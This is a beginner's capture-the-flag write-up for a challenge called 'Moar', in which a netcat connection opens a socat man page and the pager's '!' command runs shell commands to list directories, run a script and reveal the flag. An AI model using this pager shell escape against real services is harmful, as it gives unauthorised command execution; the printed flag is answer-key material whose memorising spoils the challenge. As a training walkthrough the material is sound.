**Challenge: Moar**


Things are getting really interesting now. We are still at "level 2" but this is a first PWN challenge! Who doesnt like a good pwn!

Allright, no attachment this time, we are going for a network ride! Netcat! Depending on how you are appoaching this CTF (your setup)
it also depends how you will use the tools.

I strongly recommend installing a Virtual Machine software and creating a bunch of them for your needs. VMs are great all around for
anything and everything security related and with so many options (Snapshots for example) they are just... a must. If you are not
familliar with VMs, check out Youtube videos for setting some up. It is easy and will save you a ton of time because you can manage
multiple OSs for any ocassion and customize them like they are your main OS if you want.
Software to use is either VMWare or Oracle VirtualBox. I myself use VMWare but VirtualBox is more than fine and it is free! 

Lets assume you have either a Linux VM or a workstation and lets go with netcat (-v for verbose):

> nc -v moar.ctfcompetition.com 1337

Lo and behold a manual page! Linux manual page. If you never used linux or didnt use it much, MAN is basically go-to for everything
you need about a program. It is just full of useful information. Like this one, it is a man page for SOCAT.
SOCAT (http://www.dest-unreach.org/socat/doc/socat.html) is simillar to netcat but a little more powerful. Netcat is old so SOCAT should
replace it but those are still advanced features and it is your choice what to use. Use zcat if you want :)

Anyway, we see a MAN page for Socat. Hmm... Lets see if it is a real MAN page or something crafted. Just press "H" couple of times
and then quit. See how it behaves and how the bottom looks like. Then try to man something else. For example type "man printf" and
you will get a manual page for printf function (also quite a good read).
And we again press some H and Q to exit and we can tell that Socat man page is a real deal. But if that is the case, we might have
some opportunity ;) Man pages have been exploited a lot. Some severe bugs, some not so but still. Lets see what we can do.

I suggest you research and find some exploit to use but simplest thing to do here is just use ! to do a "shell-injection". It is not
a real shell-injection but it is still powerful. You can basically use any command you like. Try typing: !ls

Boom:


> Manual page socat(1) line 1 (press h for help or q to quit)!ls<br/>
> !ls<br/>
> bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var<br/>
> boot  etc  lib	 media	opt  root  sbin  sys  usr<br/>
> !done  (press RETURN)<br/>

So we can do a LOT with this. Now, a little lesson for everyone new to CTFs and about flags. Be it a PWN or a full Blackbox attack,
flag will in 90% of cases be in the high directories like /home or /some_user/... and even /Desktop. In some cases flag can be hidden
anywhere but if you pwn the box you will find it eventually. So we will do a:

> !ls -la /home<br/>
> total 12<br/>
> drwxr-xr-x  3 nobody nogroup 4096 Jun 14 14:17 .<br/>
> drwxr-xr-x 21 moar   moar    4096 Jun 29 14:36 ..<br/>
> drwxr-xr-x  2 nobody nogroup 4096 Jun 29 14:13 moar<br/>
> !done  (press RETURN)<br/>

And see, this is /home and has /moar directory. If you do the same command but just add:

> !ls -la /home/moar

you will get the contents of the moar directory and you can see the shell script. So just run it like this to remove the "DMZ" :)

> /home/moar:
> disable_dmz.sh
> !done  (press RETURN)!/home/moar/disable_dmz.sh

> !/home/moar/disable_dmz.sh
> Disabling DMZ using password CTF{SOmething-CATastr0phic}


This was a nice challenge. For beginners it clearly states that MANUAL pages are a very good source of information but like everything
else, there are always bugs to exploit which you can look up.





